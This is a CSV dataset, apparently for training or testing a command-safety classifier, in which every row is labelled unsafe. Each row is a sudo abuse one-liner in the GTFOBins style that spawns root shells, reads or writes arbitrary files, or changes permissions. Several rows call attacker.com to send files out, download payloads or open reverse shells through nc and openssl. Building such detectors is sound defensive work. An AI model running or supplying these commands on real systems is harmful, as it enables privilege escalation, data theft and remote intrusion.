isSafe,command
0,LFILE=file_to_read sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so 
0,sudo aa-exec /bin/sh
0,URL=http://attacker.com/ LFILE=file_to_send sudo ab -p $LFILE $URL 
0,"LFILE=file_to_read sudo alpine -F ""$LFILE"" "
0,"TF=$(mktemp) echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF sudo ansible-playbook $TF "
0,sudo ansible-test shell
0,sudo aoss /bin/sh
0,"LFILE=file_to_read sudo apache2ctl -c ""Include $LFILE"" -k stop "
0,sudo apt-get changelog apt !/bin/sh 
0,sudo apt changelog apt !/bin/sh 
0,"TF=$(mktemp -u) LFILE=file_to_read sudo ar r ""$TF"" ""$LFILE"" cat ""$TF"" "
0,"COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF sudo aria2c --on-download-error=$TF http://x "
0,"TF=$(mktemp -d) LFILE=file_to_write LDIR=where_to_write echo DATA >""$TF/$LFILE"" arj a ""$TF/a"" ""$TF/$LFILE"" sudo arj e ""$TF/a"" $LDIR "
0,"LFILE=file_to_read sudo arp -v -f ""$LFILE"" "
0,LFILE=file_to_read sudo as @$LFILE 
0,"LFILE=file_to_read sudo ascii-xfr -ns ""$LFILE"" "
0,"LFILE=file_to_read sudo ascii85 ""$LFILE"" | ascii85 --decode "
0,sudo ash
0,"LFILE=file_to_read sudo aspell -c ""$LFILE"" "
0,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null "
0,"LFILE=file_to_read sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}' "
0,"sudo awk 'BEGIN {system(""/bin/sh"")}'"
0,sudo aws help !/bin/sh 
0,"LFILE=file_to_read sudo base32 ""$LFILE"" | base32 --decode "
0,"LFILE=file_to_read sudo base58 ""$LFILE"" | base58 --decode "
0,"LFILE=file_to_read sudo base64 ""$LFILE"" | base64 --decode "
0,LFILE=file_to_read sudo basenc --base64 $LFILE | basenc -d --base64 
0,"LFILE=file_to_read sudo basez ""$LFILE"" | basez --decode "
0,sudo bash
0,sudo batcat --paging always /etc/profile !/bin/sh 
0,LFILE=file_to_read sudo bc -s $LFILE quit 
0,sudo bconsole @exec /bin/sh 
0,"sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'"
0,"LFILE=file_to_read sudo bridge -b ""$LFILE"" "
0,sudo bundle help !/bin/sh 
0,sudo bundler help !/bin/sh 
0,"sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2' "
0,sudo busybox sh
0,"TF=$(mktemp) echo 'system(""/bin/sh"")' > $TF sudo byebug $TF continue "
0,LFILE=file_to_read sudo bzip2 -c $LFILE | bzip2 -d 
0,"sudo c89 -wrapper /bin/sh,-s ."
0,"sudo c99 -wrapper /bin/sh,-s ."
0,sudo cabal exec -- /bin/sh
0,sudo capsh --
0,"LFILE=file_to_read sudo cat ""$LFILE"" "
0,sudo cdist shell -s /bin/sh
0,TF=$(mktemp -d) sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0' 
0,"sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx"
0,LFILE=file_to_read sudo check_cups --extra-opts=@$LFILE 
0,LFILE=file_to_write INPUT=input_file sudo check_log -F $INPUT -O $LFILE 
0,LFILE=file_to_read sudo check_memory --extra-opts=@$LFILE 
0,LFILE=file_to_read sudo check_raid --extra-opts=@$LFILE 
0,"COMMAND=id OUTPUT=output_file TF=$(mktemp) echo ""$COMMAND | tee $OUTPUT"" > $TF chmod +x $TF umask 022 check_ssl_cert --curl-bin $TF -H example.net cat $OUTPUT "
0,LFILE=file_to_read sudo check_statusfile $LFILE 
0,LFILE=file_to_change sudo chmod 6777 $LFILE 
0,sudo choom -n 0 /bin/sh
0,LFILE=file_to_change sudo chown $(id -un):$(id -gn) $LFILE 
0,sudo chroot / 
0,LFILE=file_to_read TF=$(mktemp -d) touch $TF/empty.yara sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p' 
0,LFILE=file_to_read sudo cmp $LFILE /dev/zero -b -l 
0,"TF=$(mktemp -d) echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x sudo cobc -xFj --frelax-syntax-checks $TF/x "
0,LFILE=file_to_read sudo column $LFILE 
0,LFILE=file_to_read sudo comm $LFILE /dev/null 2>/dev/null 
0,"TF=$(mktemp -d) echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json sudo composer --working-dir=$TF run-script x "
0,"TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF sudo cowsay -f $TF x "
0,"TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF sudo cowthink -f $TF x "
0,"LFILE=file_to_write echo ""DATA"" | sudo cp /dev/stdin ""$LFILE"" "
0,sudo cpan ! exec '/bin/bash' 
0,echo '/bin/sh </dev/tty >/dev/tty' >localhost sudo cpio -o --rsh-command /bin/sh -F localhost: 
0,sudo cpulimit -l 100 -f /bin/sh
0,sudo crash -h !sh 
0,sudo crontab -e
0,sudo csh
0,LFILE=file_to_read csplit $LFILE 1 cat xx01 
0,sudo csvtool call '/bin/sh;false' /etc/passwd
0,LFILE=file_to_read sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE 
0,URL=http://attacker.com/file_to_get LFILE=file_to_save sudo curl $URL -o $LFILE 
0,"LFILE=file_to_read sudo cut -d """""""" -f1 ""$LFILE"" "
0,sudo dash
0,LFILE=file_to_read sudo date -f $LFILE 
0,sudo dc -e '!/bin/sh'
0,"LFILE=file_to_write echo ""data"" | sudo dd of=$LFILE "
0,sudo debugfs !/bin/sh 
0,"LFILE=file_to_read sudo dialog --textbox ""$LFILE"" 0 0 "
0,LFILE=file_to_read sudo diff --line-format=%L /dev/null $LFILE 
0,LFILE=file_to_read sudo dig -f $LFILE 
0,sudo distcc /bin/sh
0,sudo dmesg -H !/bin/sh 
0,"LFILE=file_to_write sudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE"" "
0,sudo dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF sudo dmsetup ls --exec '/bin/sh -s' 
0,sudo dnf install -y x-1.0-1.noarch.rpm 
0,sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
0,"LFILE='\path\to\file_to_write' sudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit"
0,"sudo dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();; "
0,sudo dpkg -l !/bin/sh 
0,"echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py sudo dstat --xxx "
0,"tex '\special{psfile=""`/bin/sh 1>&0""}\end' sudo dvips -R0 texput.dvi "
0,"TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py sudo easy_install $TF "
0,sudo eb logs !/bin/sh 
0,sudo ed !/bin/sh 
0,"LFILE=file_to_read sudo efax -d ""$LFILE"" "
0,sudo elvish
0,"sudo emacs -Q -nw --eval '(term ""/bin/sh"")'"
0,sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
0,sudo env /bin/sh
0,"LFILE=file_to_read sudo eqn ""$LFILE"" "
0,"LFILE=file_to_read sudo espeak -qXf ""$LFILE"" "
0,sudo ex !/bin/sh 
0,LFILE=file_to_write INPUT=input_file sudo exiftool -filename=$LFILE $INPUT 
0,"LFILE=file_to_read sudo expand ""$LFILE"" "
0,sudo expect -c 'spawn /bin/sh;interact'
0,"TF=$(mktemp -d) echo 'exec(""/bin/sh"")' > $TF/x.rb sudo FACTERLIB=$TF facter "
0,LFILE=file_to_read sudo file -f $LFILE 
0,sudo find . -exec /bin/sh \; -quit
0,sudo fish
0,sudo flock -u / /bin/sh
0,"LFILE=file_to_read sudo fmt -999 ""$LFILE"" "
0,"LFILE=file_to_read sudo fold -w99999999 ""$LFILE"" "
0,LFILE=file_to_read sudo fping -f $LFILE 
0,sudo ftp !/bin/sh 
0,"sudo gawk 'BEGIN {system(""/bin/sh"")}'"
0,"sudo gcc -wrapper /bin/sh,-s ."
0,sudo gcloud help !/bin/sh 
0,sudo gcore $PID
0,sudo gdb -nx -ex '!sh' -ex quit
0,"sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc"
0,sudo genie -c '/bin/sh'
0,"LFILE=file_to_read sudo genisoimage -q -o - ""$LFILE"" "
0,"sudo ghc -e 'System.Process.callCommand ""/bin/sh""'"
0,"sudo ghci System.Process.callCommand ""/bin/sh"" "
0,"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'"
0,sudo ginsh !/bin/sh 
0,"sudo PAGER='sh -c ""exec sh 0<&1""' git -p help"
0,sudo grc --pty /bin/sh
0,LFILE=file_to_read sudo grep '' $LFILE 
0,TF=$(mktemp) echo '#!/bin/sh' > $TF echo 'exec /bin/sh 0<&1' >> $TF chmod +x $TF sudo gtester -q $TF 
0,LFILE=file_to_read sudo gzip -f $LFILE -t 
0,"LFILE=file_to_read sudo hd ""$LFILE"" "
0,"LFILE=file_to_read sudo head -c1G ""$LFILE"" "
0,"LFILE=file_to_read sudo hexdump -C ""$LFILE"" "
0,"LFILE=file_to_read sudo highlight --no-doc --failsafe ""$LFILE"" "
0,sudo hping3 /bin/sh 
0,"LFILE=file_to_read ./iconv -f 8859_1 -t 8859_1 ""$LFILE"" "
0,sudo iftop !/bin/sh 
0,LFILE=file_to_change TF=$(mktemp) sudo install -m 6777 $LFILE $TF 
0,sudo ionice /bin/sh
0,"LFILE=file_to_read sudo ip -force -batch ""$LFILE"" "
0,sudo irb exec '/bin/bash' 
0,sudo ispell /etc/passwd !/bin/sh 
0,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs"
0,sudo joe ^K!/bin/sh 
0,LFILE=file_to_read sudo join -a 2 /dev/null $LFILE 
0,sudo journalctl !/bin/sh 
0,"LFILE=file_to_read sudo jq -Rr . ""$LFILE"" "
0,"sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"""
0,sudo jtag --interactive shell /bin/sh 
0,sudo julia -e 'run(`/bin/sh`)' 
0,"sudo knife exec -E 'exec ""/bin/sh""' "
0,sudo ksh
0,LFILE=file_to_read sudo ksshell -i $LFILE 
0,sudo ksu -q -e /bin/sh
0,LFILE=dir_to_serve sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/ 
0,sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi 
0,"sudo latexmk -e 'exec ""/bin/sh"";'"
0,sudo /lib/ld.so /bin/sh
0,"TF=$(mktemp -d) echo ""$TF"" > ""$TF/conf"" # move malicious libraries in $TF sudo ldconfig -f ""$TF/conf"" "
0,sudo less /etc/profile !/bin/sh 
0,sudo lftp -c '!/bin/sh'
0,"LFILE=file_to_read sudo links ""$LFILE"" "
0,sudo ln -fs /bin/sh /bin/ln sudo ln 
0,sudo loginctl user-status !/bin/sh 
0,sudo logsave /dev/null /bin/sh -i
0,"LFILE=file_to_read sudo look '' ""$LFILE"" "
0,sudo ltrace -b -L /bin/sh
0,"sudo lua -e 'os.execute(""/bin/sh"")'"
0,"sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'"
0,"sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'"
0,URL=http://attacker.com/file_to_get LFILE=file_to_save sudo lwp-download $URL $LFILE 
0,"LFILE=file_to_read sudo lwp-request ""file://$LFILE"" "
0,sudo mail --exec='!/bin/sh'
0,"COMMAND='/bin/sh' sudo make -s --eval=$'x:\n\t-'""$COMMAND"" "
0,sudo man man !/bin/sh 
0,"sudo mawk 'BEGIN {system(""/bin/sh"")}'"
0,sudo minicom -D /dev/null 
0,TERM= sudo more /etc/profile !/bin/sh 
0,"LFILE=file_to_read sudo mosquitto -c ""$LFILE"" "
0,sudo mount -o bind /bin/sh /bin/mount sudo mount 
0,"sudo msfconsole msf6 > irb >> system(""/bin/sh"") "
0,LFILE=file_to_read sudo msgattrib -P $LFILE 
0,LFILE=file_to_read sudo msgcat -P $LFILE 
0,LFILE=file_to_read sudo msgconv -P $LFILE 
0,echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID' 
0,LFILE=file_to_read sudo msgmerge -P $LFILE /dev/null 
0,LFILE=file_to_read sudo msguniq -P $LFILE 
0,"LFILE=file_to_read sudo mtr --raw -F ""$LFILE"" "
0,sudo multitime /bin/sh
0,"LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF sudo mv $TF $LFILE "
0,sudo mysql -e '\! /bin/sh'
0,sudo nano ^R^X reset; sh 1>&0 2>&0 
0,LFILE=file_to_read sudo nasm -@ $LFILE 
0,"sudo nawk 'BEGIN {system(""/bin/sh"")}'"
0,RHOST=attacker.com RPORT=12345 sudo nc -e /bin/sh $RHOST $RPORT 
0,sudo ncdu b 
0,sudo ncftp !/bin/sh 
0,TF=$(mktemp) echo 'exec /bin/sh' >$TF sudo neofetch --config $TF 
0,"LFILE=file_to_read sudo nft -f ""$LFILE"" "
0,sudo nice /bin/sh
0,LFILE=file_to_read sudo nl -bn -w1 -s '' $LFILE 
0,LFILE=file_to_read sudo nm @$LFILE 
0,"TF=$(mktemp) echo 'os.execute(""/bin/sh"")' > $TF sudo nmap --script=$TF "
0,"sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)"""
0,"TF=$(mktemp -d) echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json sudo npm -C $TF --unsafe-perm i "
0,TF=$(mktemp -d) echo '#!/bin/sh' > $TF/groff echo '/bin/sh' >> $TF/groff chmod +x $TF/groff sudo GROFF_BIN_PATH=$TF nroff 
0,sudo nsenter /bin/sh
0,LFILE=file_to_read sudo ntpdate -a x -k $LFILE -d localhost 
0,"sudo octave-cli --eval 'system(""/bin/sh"")'"
0,"LFILE=file_to_read sudo od -An -c -w9999 ""$LFILE"" "
0,RHOST=attacker.com RPORT=12345 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s 
0,sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh' 
0,"COMMAND=id TF=$(mktemp -u) sudo openvt -- sh -c ""$COMMAND >$TF 2>&1"" cat $TF "
0,sudo opkg install x_1.0_all.deb 
0,"TF=$(mktemp) echo 'os.execute(""/bin/sh"")' >$TF sudo pandoc -L $TF /dev/null "
0,LFILE=file_to_read sudo paste $LFILE 
0,"TF=$(mktemp) echo 'import os; os.system(""/bin/sh"")' > $TF sudo pdb $TF cont "
0,sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' pdftotext article.pdf - 
0,sudo pdftex --shell-escape '\write18{/bin/sh}\end' 
0,sudo perf stat /bin/sh 
0,"sudo perl -e 'exec ""/bin/sh"";'"
0,sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
0,sudo pexec /bin/sh
0,sudo pg /etc/profile !/bin/sh 
0,"CMD=""/bin/sh"" sudo php -r ""system('$CMD');"" "
0,sudo pic -U .PS sh X sh X 
0,sudo pico ^R^X reset; sh 1>&0 2>&0 
0,COMMAND=id sudo pidstat -e $COMMAND 
0,"TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py sudo pip install $TF "
0,sudo pkexec /bin/sh
0,sudo pkg install -y --no-repo-update ./x-1.0.txz 
0,sudo posh
0,LFILE=file_to_read pr -T $LFILE 
0,"sudo pry system(""/bin/sh"") "
0,sudo psftp !/bin/sh 
0,psql \? !/bin/sh 
0,"LFILE=file_to_read sudo ptx -w 5000 ""$LFILE"" "
0,"sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }"" "
0,sudo pwsh
0,"sudo python -c 'import os; os.system(""/bin/sh"")'"
0,sudo rake -p '`/bin/sh 1>&0`'
0,sudo rc -c '/bin/sh'
